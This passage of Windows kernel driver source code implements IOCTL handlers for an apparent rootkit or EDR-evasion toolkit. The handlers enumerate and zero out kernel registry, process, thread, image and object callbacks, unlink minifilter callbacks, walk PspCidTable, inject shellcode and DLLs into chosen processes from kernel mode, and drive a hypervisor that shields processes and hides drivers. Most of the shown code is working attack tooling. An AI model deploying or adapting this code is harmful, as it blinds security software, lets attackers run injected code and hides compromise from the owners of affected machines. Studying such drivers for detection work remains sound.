						cbInfo->Altitude[MAX_ALTITUDE_LENGTH - 1] = '\0';
						RtlFreeAnsiString(&ansiAltitude);
					}
				}

				// Resolve module information
				SearchModulesForRegistry(cbInfo);

				KdPrint((DRIVER_PREFIX "[%d] RegistryCallback: 0x%llX (%s+0x%llX) Altitude=%s\n",
					callbackCount, cbInfo->CallbackAddress, cbInfo->ModuleName,
					cbInfo->ModuleOffset, cbInfo->Altitude));

				callbackCount++;
			}

			// Move to next entry
			entry = entry->Flink;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception during registry callback enumeration\n"));
		status = STATUS_UNSUCCESSFUL;
	}

	response->Count = callbackCount;
	KdPrint((DRIVER_PREFIX "Found %d registry callbacks\n", callbackCount));
	*info = requiredSize;
	return status;
}

NTSTATUS HandleRemoveRegistryCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRemoveRegistryCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RemoveRegistryCallbackRequest))
	{
		KdPrint((DRIVER_PREFIX "Buffer too small\n"));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RemoveRegistryCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		KdPrint((DRIVER_PREFIX "Invalid parameter: null request\n"));
		return STATUS_INVALID_PARAMETER;
	}

	// Find the CallbackListHead
	ULONG64 callbackListHead = FindCmCallbackListHead();
	if (!callbackListHead)
	{
		KdPrint((DRIVER_PREFIX "Failed to find registry CallbackListHead\n"));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		// Traverse the callback list to find the item at the specified index
		PLIST_ENTRY entry = ((PLIST_ENTRY)callbackListHead)->Flink;
		ULONG currentIndex = 0;
		BOOLEAN found = FALSE;

		while ((ULONG64)entry != callbackListHead)
		{
			if (currentIndex == request->Index)
			{
				PREGISTRY_CALLBACK_ITEM callbackItem = CONTAINING_RECORD(entry, REGISTRY_CALLBACK_ITEM, Item);

				if (callbackItem && MmIsAddressValid(callbackItem))
				{
					ULONG64 oldFunction = callbackItem->Function;

					// Save original values for restoration
					g_RemovedRegistryCallbacks[request->Index].IsRemoved = TRUE;
					g_RemovedRegistryCallbacks[request->Index].OriginalFunction = oldFunction;
					g_RemovedRegistryCallbacks[request->Index].CallbackItem = callbackItem;
					// Save original list links for potential re-linking
					g_RemovedRegistryCallbacks[request->Index].OriginalLinks.Flink = callbackItem->Item.Flink;
					g_RemovedRegistryCallbacks[request->Index].OriginalLinks.Blink = callbackItem->Item.Blink;

					// Zero out the callback function address to disable it (don't remove from list for easier restoration)
					RtlZeroMemory(&callbackItem->Function, sizeof(callbackItem->Function));

					KdPrint((DRIVER_PREFIX "Removed registry callback at index %d (was 0x%llX, saved for restore)\n",
						request->Index, oldFunction));
					found = TRUE;
				}
				break;
			}

			currentIndex++;
			entry = entry->Flink;
		}

		if (!found)
		{
			KdPrint((DRIVER_PREFIX "Registry callback at index %d not found\n", request->Index));
			return STATUS_NOT_FOUND;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception while removing registry callback at index %d\n", request->Index));
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

// ============== Callback Restore Handlers ==============

NTSTATUS HandleRestoreProcessCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRestoreProcessCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RestoreCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RestoreCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_CALLBACK_ENTRIES)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Check if we have saved data for this index
	if (!g_RemovedProcessCallbacks[request->Index].IsRemoved)
	{
		KdPrint((DRIVER_PREFIX "No saved process callback at index %d\n", request->Index));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		ULONG64 slotAddress = g_RemovedProcessCallbacks[request->Index].SlotAddress;
		ULONG64 originalValue = g_RemovedProcessCallbacks[request->Index].OriginalValue;

		// Verify the slot is still valid
		if (!MmIsAddressValid((PVOID)slotAddress))
		{
			KdPrint((DRIVER_PREFIX "Slot address 0x%llX is no longer valid\n", slotAddress));
			return STATUS_INVALID_ADDRESS;
		}

		// Restore the original value
		*(PULONG64)slotAddress = originalValue;

		// Clear the saved data
		g_RemovedProcessCallbacks[request->Index].IsRemoved = FALSE;
		g_RemovedProcessCallbacks[request->Index].OriginalValue = 0;
		g_RemovedProcessCallbacks[request->Index].SlotAddress = 0;

		KdPrint((DRIVER_PREFIX "Restored process callback at index %d\n", request->Index));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception while restoring process callback at index %d\n", request->Index));
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleRestoreThreadCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRestoreThreadCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RestoreCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RestoreCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_CALLBACK_ENTRIES)
	{
		return STATUS_INVALID_PARAMETER;
	}

	if (!g_RemovedThreadCallbacks[request->Index].IsRemoved)
	{
		KdPrint((DRIVER_PREFIX "No saved thread callback at index %d\n", request->Index));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		ULONG64 slotAddress = g_RemovedThreadCallbacks[request->Index].SlotAddress;
		ULONG64 originalValue = g_RemovedThreadCallbacks[request->Index].OriginalValue;

		if (!MmIsAddressValid((PVOID)slotAddress))
		{
			return STATUS_INVALID_ADDRESS;
		}

		*(PULONG64)slotAddress = originalValue;

		g_RemovedThreadCallbacks[request->Index].IsRemoved = FALSE;
		g_RemovedThreadCallbacks[request->Index].OriginalValue = 0;
		g_RemovedThreadCallbacks[request->Index].SlotAddress = 0;

		KdPrint((DRIVER_PREFIX "Restored thread callback at index %d\n", request->Index));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleRestoreImageCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRestoreImageCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RestoreCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RestoreCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_CALLBACK_ENTRIES)
	{
		return STATUS_INVALID_PARAMETER;
	}

	if (!g_RemovedImageCallbacks[request->Index].IsRemoved)
	{
		KdPrint((DRIVER_PREFIX "No saved image callback at index %d\n", request->Index));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		ULONG64 slotAddress = g_RemovedImageCallbacks[request->Index].SlotAddress;
		ULONG64 originalValue = g_RemovedImageCallbacks[request->Index].OriginalValue;

		if (!MmIsAddressValid((PVOID)slotAddress))
		{
			return STATUS_INVALID_ADDRESS;
		}

		*(PULONG64)slotAddress = originalValue;

		g_RemovedImageCallbacks[request->Index].IsRemoved = FALSE;
		g_RemovedImageCallbacks[request->Index].OriginalValue = 0;
		g_RemovedImageCallbacks[request->Index].SlotAddress = 0;

		KdPrint((DRIVER_PREFIX "Restored image callback at index %d\n", request->Index));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleRestoreObjectCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRestoreObjectCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RestoreObjectCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RestoreObjectCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Select the correct storage array based on object type
	RemovedObjectCallback* storage = (request->ObjectType == ObjectCallbackProcess)
		? g_RemovedProcessObjectCallbacks
		: g_RemovedThreadObjectCallbacks;

	if (!storage[request->Index].IsRemoved)
	{
		KdPrint((DRIVER_PREFIX "No saved object callback at index %d\n", request->Index));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		PCALLBACK_ENTRY_ITEM callbackItem = (PCALLBACK_ENTRY_ITEM)storage[request->Index].CallbackEntryItem;

		if (!callbackItem || !MmIsAddressValid(callbackItem))
		{
			return STATUS_INVALID_ADDRESS;
		}

		// Restore PreOperation if requested and we have saved data
		if (request->RestorePreOperation && storage[request->Index].PreOperation)
		{
			InterlockedExchangePointer((PVOID*)&callbackItem->PreOperation,
				storage[request->Index].PreOperation);
			KdPrint((DRIVER_PREFIX "Restored PreOperation to 0x%llX\n",
				(ULONG64)storage[request->Index].PreOperation));
			storage[request->Index].PreOperation = NULL;
		}

		// Restore PostOperation if requested and we have saved data
		if (request->RestorePostOperation && storage[request->Index].PostOperation)
		{
			InterlockedExchangePointer((PVOID*)&callbackItem->PostOperation,
				storage[request->Index].PostOperation);
			KdPrint((DRIVER_PREFIX "Restored PostOperation to 0x%llX\n",
				(ULONG64)storage[request->Index].PostOperation));
			storage[request->Index].PostOperation = NULL;
		}

		// If both operations are restored, clear the removed flag
		if (!storage[request->Index].PreOperation && !storage[request->Index].PostOperation)
		{
			storage[request->Index].IsRemoved = FALSE;
			storage[request->Index].CallbackEntryItem = NULL;
		}

		KdPrint((DRIVER_PREFIX "Restored object callback at index %d\n", request->Index));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleRestoreRegistryCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRestoreRegistryCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RestoreRegistryCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RestoreRegistryCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_REGISTRY_CALLBACK_ENTRIES)
	{
		return STATUS_INVALID_PARAMETER;
	}

	if (!g_RemovedRegistryCallbacks[request->Index].IsRemoved)
	{
		KdPrint((DRIVER_PREFIX "No saved registry callback at index %d\n", request->Index));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		PREGISTRY_CALLBACK_ITEM callbackItem =
			(PREGISTRY_CALLBACK_ITEM)g_RemovedRegistryCallbacks[request->Index].CallbackItem;

		if (!callbackItem || !MmIsAddressValid(callbackItem))
		{
			return STATUS_INVALID_ADDRESS;
		}

		// Restore the original function pointer
		callbackItem->Function = g_RemovedRegistryCallbacks[request->Index].OriginalFunction;

		// Clear the saved data
		g_RemovedRegistryCallbacks[request->Index].IsRemoved = FALSE;
		g_RemovedRegistryCallbacks[request->Index].OriginalFunction = 0;
		g_RemovedRegistryCallbacks[request->Index].CallbackItem = NULL;

		KdPrint((DRIVER_PREFIX "Restored registry callback at index %d to 0x%llX\n",
			request->Index, callbackItem->Function));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleEnumMinifilters(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Enumerating minifilters\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(EnumMinifiltersResponse) +
		(sizeof(MinifilterInfo) * (MAX_MINIFILTER_ENTRIES - 1));

	if (outputLen < requiredSize)
	{
		KdPrint((DRIVER_PREFIX "Buffer too small (need %d bytes, got %d)\n", requiredSize, outputLen));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (EnumMinifiltersResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, requiredSize);

	ULONG filterCount = 0;

	// Enumerate using Filter Manager APIs (documented approach)
	BOOLEAN success = EnumerateMinifiltersViaApi(response->Entries, &filterCount, MAX_MINIFILTER_ENTRIES);

	if (!success)
	{
		KdPrint((DRIVER_PREFIX "Minifilter enumeration failed - Filter Manager APIs unavailable\n"));
	}

	response->Count = filterCount;
	KdPrint((DRIVER_PREFIX "Found %u total minifilters\n", filterCount));
	*info = requiredSize;
	return STATUS_SUCCESS;
}

NTSTATUS HandleUnlinkMinifilter(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "Unlink minifilter callbacks request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(UnlinkMinifilterRequest))
	{
		KdPrint((DRIVER_PREFIX "Buffer too small (need %u, got %u)\n",
			(ULONG)sizeof(UnlinkMinifilterRequest), inputLen));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (UnlinkMinifilterRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Ensure null-terminated
	request->FilterName[MAX_FILTER_NAME_LENGTH - 1] = L'\0';

	KdPrint((DRIVER_PREFIX "Unlinking callbacks for filter: %ws\n", request->FilterName));

	NTSTATUS status = UnlinkMinifilterCallbacks(request->FilterName);

	if (NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Successfully unlinked minifilter callbacks\n"));
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Failed to unlink minifilter callbacks: 0x%08X\n", status));
	}

	return status;
}

NTSTATUS HandleEnumDrivers(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Driver enumeration request\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(EnumDriversResponse) +
		(sizeof(KernelDriverInfo) * (MAX_DRIVER_ENTRIES - 1));

	if (outputLen < requiredSize)
	{
		KdPrint((DRIVER_PREFIX "Buffer too small (need %u, got %u)\n", requiredSize, outputLen));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (EnumDriversResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, requiredSize);

	ULONG driverCount = 0;
	BOOLEAN success = EnumerateKernelDrivers(response->Entries, &driverCount, MAX_DRIVER_ENTRIES);

	if (!success)
	{
		return STATUS_UNSUCCESSFUL;
	}

	response->Count = driverCount;
	KdPrint((DRIVER_PREFIX "Returning %u drivers\n", driverCount));
	*info = requiredSize;
	return STATUS_SUCCESS;
}

NTSTATUS HandleEnumPspCidTable(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "PspCidTable enumeration request\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(EnumCidTableResponse) + (sizeof(CidEntry) * (MAX_CID_ENTRIES - 1));

	if (outputLen < requiredSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (EnumCidTableResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Find PspCidTable
	PVOID64 pspCidTableAddr = GetPspCidTableAddress();
	if (!pspCidTableAddr)
	{
		KdPrint((DRIVER_PREFIX "Failed to locate PspCidTable\n"));
		return STATUS_NOT_FOUND;
	}

	NTSTATUS status = STATUS_SUCCESS;

	__try
	{
		// Get HANDLE_TABLE pointer
		PVOID64 handleTable = *(PVOID64*)pspCidTableAddr;
		if (!MmIsAddressValid(handleTable))
		{
			KdPrint((DRIVER_PREFIX "Invalid HANDLE_TABLE address\n"));
			return STATUS_INVALID_ADDRESS;
		}

		// Get TableCode (offset +8 in _HANDLE_TABLE)
		ULONG64 tableCode = *(PULONG64)((ULONG64)handleTable + 8);
		KdPrint((DRIVER_PREFIX "TableCode: 0x%llX\n", tableCode));

		// Extract table level from lower 2 bits
		INT tableLevel = (INT)(tableCode & 3);
		ULONG64 tableBase = tableCode & ~3ULL;

		KdPrint((DRIVER_PREFIX "Table level: %d, Base: 0x%llX\n", tableLevel, tableBase));

		// Initialize response
		response->Count = 0;

		// Parse based on table level
		if (tableLevel == 0)
		{
			// Level-1 table
			ParseCidTable1(tableBase, 0, 0, response->Entries, &response->Count, MAX_CID_ENTRIES);
		}
		else if (tableLevel == 1)
		{
			// Level-2 table
			ParseCidTable2(tableBase, 0, response->Entries, &response->Count, MAX_CID_ENTRIES);
		}
		else if (tableLevel == 2)
		{
			// Level-3 table
			ParseCidTable3(tableBase, response->Entries, &response->Count, MAX_CID_ENTRIES);
		}
		else
		{
			KdPrint((DRIVER_PREFIX "Invalid table level: %d\n", tableLevel));
			return STATUS_INVALID_PARAMETER;
		}

		KdPrint((DRIVER_PREFIX "Enumerated %u CID entries\n", response->Count));
		*info = sizeof(EnumCidTableResponse) + (sizeof(CidEntry) * (response->Count > 0 ? response->Count - 1 : 0));
		status = STATUS_SUCCESS;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception during PspCidTable enumeration\n"));
		status = STATUS_UNSUCCESSFUL;
	}

	return status;
}

// ============== Kernel Injection Handlers ==============

NTSTATUS HandleKernelInjectShellcode(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Kernel shellcode injection request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(KernelInjectShellcodeRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(KernelInjectShellcodeResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (KernelInjectShellcodeRequest*)Irp->AssociatedIrp.SystemBuffer;
	auto response = (KernelInjectShellcodeResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (!request || request->ShellcodeSize == 0)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Validate buffer size
	SIZE_T expectedSize = FIELD_OFFSET(KernelInjectShellcodeRequest, Shellcode) + request->ShellcodeSize;
	if (inputLen < expectedSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	KdPrint((DRIVER_PREFIX "Injecting %u bytes of shellcode into PID %u\n",
		request->ShellcodeSize, request->TargetProcessId));

	PVOID allocatedAddress = nullptr;
	NTSTATUS status = KernelInjectShellcode(
		request->TargetProcessId,
		request->Shellcode,
		request->ShellcodeSize,
		&allocatedAddress
	);

	if (NT_SUCCESS(status))
	{
		response->Success = TRUE;
		response->AllocatedAddress = (ULONG64)allocatedAddress;
		*info = sizeof(KernelInjectShellcodeResponse);
		KdPrint((DRIVER_PREFIX "Kernel shellcode injection successful\n"));
	}
	else
	{
		response->Success = FALSE;
		response->AllocatedAddress = 0;
		*info = sizeof(KernelInjectShellcodeResponse);
		KdPrint((DRIVER_PREFIX "Kernel shellcode injection failed: 0x%X\n", status));
	}

	return status;
}

NTSTATUS HandleKernelInjectDll(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Kernel DLL injection request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(KernelInjectDllRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(KernelInjectDllResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (KernelInjectDllRequest*)Irp->AssociatedIrp.SystemBuffer;
	auto response = (KernelInjectDllResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Ensure DLL path is null-terminated
	request->DllPath[MAX_DLL_PATH_LENGTH - 1] = L'\0';

	KdPrint((DRIVER_PREFIX "Injecting DLL into PID %u: %ws\n",
		request->TargetProcessId, request->DllPath));

	PVOID allocatedAddress = nullptr;
	PVOID loadLibraryAddress = nullptr;
	NTSTATUS status = KernelInjectDll(
		request->TargetProcessId,
		request->DllPath,
		&allocatedAddress,
		&loadLibraryAddress
	);

	if (NT_SUCCESS(status))
	{
		response->Success = TRUE;
		response->AllocatedAddress = (ULONG64)allocatedAddress;
		response->LoadLibraryAddress = (ULONG64)loadLibraryAddress;
		*info = sizeof(KernelInjectDllResponse);
		KdPrint((DRIVER_PREFIX "Kernel DLL injection successful\n"));
	}
	else
	{
		response->Success = FALSE;
		response->AllocatedAddress = 0;
		response->LoadLibraryAddress = 0;
		*info = sizeof(KernelInjectDllResponse);
		KdPrint((DRIVER_PREFIX "Kernel DLL injection failed: 0x%X\n", status));
	}

	return status;
}

// ============== Hypervisor Control Handlers ==============

NTSTATUS HandleHvStart(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);
	UNREFERENCED_PARAMETER(info);

	KdPrint((DRIVER_PREFIX "Starting hypervisor...\n"));

	NTSTATUS status = HvStartHypervisor();

	if (NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Hypervisor started successfully\n"));
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Failed to start hypervisor: 0x%X\n", status));
	}

	return status;
}

NTSTATUS HandleHvStop(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);
	UNREFERENCED_PARAMETER(info);

	KdPrint((DRIVER_PREFIX "Stopping hypervisor...\n"));
	HvStopHypervisor();
	KdPrint((DRIVER_PREFIX "Hypervisor stopped\n"));

	return STATUS_SUCCESS;
}

NTSTATUS HandleHvPing(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	if (outputLen < sizeof(HvPingResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (HvPingResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	response->IsRunning = HvIsHypervisorRunning();
	response->HooksInstalled = HvAreHooksInstalled();
	response->ProtectedProcessCount = HvGetProtectedPidCount();

	*info = sizeof(HvPingResponse);

	KdPrint((DRIVER_PREFIX "HV Ping: Running=%d, Hooks=%d, Protected=%u\n",
		response->IsRunning, response->HooksInstalled, response->ProtectedProcessCount));

	return STATUS_SUCCESS;
}

NTSTATUS HandleHvInstallHooks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);
	UNREFERENCED_PARAMETER(info);

	KdPrint((DRIVER_PREFIX "Installing protection hooks...\n"));

	NTSTATUS status = HvInstallProtectionHooks();

	if (NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Protection hooks installed successfully\n"));
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Failed to install protection hooks: 0x%X\n", status));
	}

	return status;
}

NTSTATUS HandleHvRemoveHooks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);
	UNREFERENCED_PARAMETER(info);

	KdPrint((DRIVER_PREFIX "Removing protection hooks...\n"));
	HvRemoveProtectionHooks();
	KdPrint((DRIVER_PREFIX "Protection hooks removed\n"));

	return STATUS_SUCCESS;
}

NTSTATUS HandleHvProtectProcess(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(info);

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(HvProtectProcessRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HvProtectProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	KdPrint((DRIVER_PREFIX "HV protecting process PID %u\n", request->ProcessId));

	bool success = HvAddProtectedPid(request->ProcessId);
	return success ? STATUS_SUCCESS : STATUS_INSUFFICIENT_RESOURCES;
}

NTSTATUS HandleHvUnprotectProcess(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(info);

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(HvProtectProcessRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HvProtectProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	KdPrint((DRIVER_PREFIX "HV unprotecting process PID %u\n", request->ProcessId));

	bool success = HvRemoveProtectedPid(request->ProcessId);
	return success ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

NTSTATUS HandleHvIsProcessProtected(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(HvProtectProcessRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(HvIsProtectedResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HvProtectProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	auto response = (HvIsProtectedResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	response->IsProtected = HvIsProcessProtectedByPid(request->ProcessId);
	*info = sizeof(HvIsProtectedResponse);

	return STATUS_SUCCESS;
}

NTSTATUS HandleHvListProtected(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (outputLen < sizeof(HvListProtectedResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (HvListProtectedResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, sizeof(HvListProtectedResponse));

	ULONG returnedCount = 0;
	NTSTATUS status = HvGetProtectedPidList(response->Pids, sizeof(response->Pids), &returnedCount);
	response->Count = returnedCount;

	*info = sizeof(HvListProtectedResponse);

	return status;
}

// ============== Hypervisor Driver Hiding Handlers ==============

NTSTATUS HandleHvHideDriver(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(info);

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;

	if (inputLen < sizeof(HideDriverRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HideDriverRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Ensure null-terminated
	request->DriverName[sizeof(request->DriverName) - 1] = '\0';

	if (strlen(request->DriverName) == 0)
	{
		return STATUS_INVALID_PARAMETER;
	}

	if (!HvEnableDriverHiding(request->DriverName))
	{
		return STATUS_UNSUCCESSFUL;
	}

	KdPrint((DRIVER_PREFIX "Driver hiding enabled for: %s\n", request->DriverName));
	return STATUS_SUCCESS;
}

NTSTATUS HandleHvUnhideDriver(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);
	UNREFERENCED_PARAMETER(info);

	HvDisableDriverHiding();
	KdPrint((DRIVER_PREFIX "Driver hiding disabled\n"));
	return STATUS_SUCCESS;
}

NTSTATUS HandleHvIsDriverHidden(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (outputLen < sizeof(DriverHiddenResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (DriverHiddenResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	response->IsHidden = HvIsDriverHidingEnabled();
	response->HiddenCount = HvGetHiddenDriverCount();
	*info = sizeof(DriverHiddenResponse);

	return STATUS_SUCCESS;
}

NTSTATUS HandleHvRemoveHiddenDriver(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(info);

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;

	if (inputLen < sizeof(HideDriverRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

